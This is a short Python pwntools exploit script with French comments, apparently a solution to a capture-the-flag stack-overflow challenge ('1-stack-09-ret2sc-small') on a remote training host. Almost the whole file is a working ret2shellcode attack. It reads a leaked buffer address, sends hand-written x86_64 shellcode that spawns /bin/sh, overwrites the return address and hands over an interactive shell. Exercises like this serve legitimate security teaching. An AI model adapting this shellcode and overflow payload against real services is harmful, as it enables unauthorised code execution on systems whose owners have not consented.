from pwn import *
context.update(arch='amd64', timeout=1)

bin_name = "1-stack-09-ret2sc-small"


#break *(main+94)
#break *(getstr+66)
if args.GDB: # debug: local exploit with terminator/gef
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(f"./{bin_name}", """
    source /home/user/.gdbinit-gef.py
    break *(main+94)
    continue
    """)
elif args.LOCAL: # exploit locally
    p = process(f"./{bin_name}")
else: # exploit online
    p = remote("cytech.tcdn.casa", 4109)

# Création de la connexion avec le service distant
# p = remote("cytech.tcdn.casa", 4109)

#execution en local
#p = process('./1-stack-06-ret2sc-simple')

# attacher gdb
#p = gdb.debug('./1-stack-06-ret2sc-simple', '''''')

# Shellcode pour exécuter /bin/sh en x86_64
#shellcode = (asm(shellcraft.sh()))

shellcode=b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"


# Récupérer l'adresse du buffer
p.recvuntil("is at ".encode('utf-8'))
address_line = p.recvline().strip()  # Récupérer la ligne entière contenant l'adresse

print(address_line)

return_address = int(address_line, 16) 

payload = shellcode + cyclic(27 - len(shellcode)) + p64(return_address)

# Envoyer le payload
p.sendline(payload)

# Interagir avec le shell obtenu
p.interactive()

#!/usr/bin/env python3


